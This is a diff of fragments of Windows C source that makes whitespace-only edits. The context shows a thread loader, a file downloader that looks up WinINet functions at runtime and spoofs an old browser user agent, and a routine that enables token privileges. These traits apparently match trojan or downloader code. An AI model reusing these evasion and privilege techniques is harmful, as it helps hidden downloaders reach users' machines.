@@ -42,7 +42,7 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
 
 		nRet = arg.start_address(arg.arglist);
 	}
-	__except (1){}
+	__except (1) {}
 
 	return nRet;
 }
@@ -253,7 +253,7 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 #ifdef UNICODE
 	NETOPEN myNetOpen = (NETOPEN)GetProcAddress(hdllde, "InternetOpenW");
 #else
-	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdllde, "InternetOpenA");
+	NETOPEN myNetOpen = (NETOPEN)GetProcAddress(hdllde, "InternetOpenA");
 #endif
 
 	hInternet = myNetOpen(_T("MSIE 6.0"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
@@ -266,7 +266,7 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 #ifdef UNICODE
 	NETOPENURL myNetOpenUrl = (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlW");
 #else
-	NETOPENURL myNetOpenUrl= (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlA");
+	NETOPENURL myNetOpenUrl = (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlA");
 #endif
 
 	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
@@ -328,7 +328,7 @@ bool DebugPrivilege(const TCHAR *PName, BOOL bEnable)
 #ifdef UNICODE
 	LPV mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
 #else
-	LPV mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
+	LPV mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
 #endif
 
 	mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
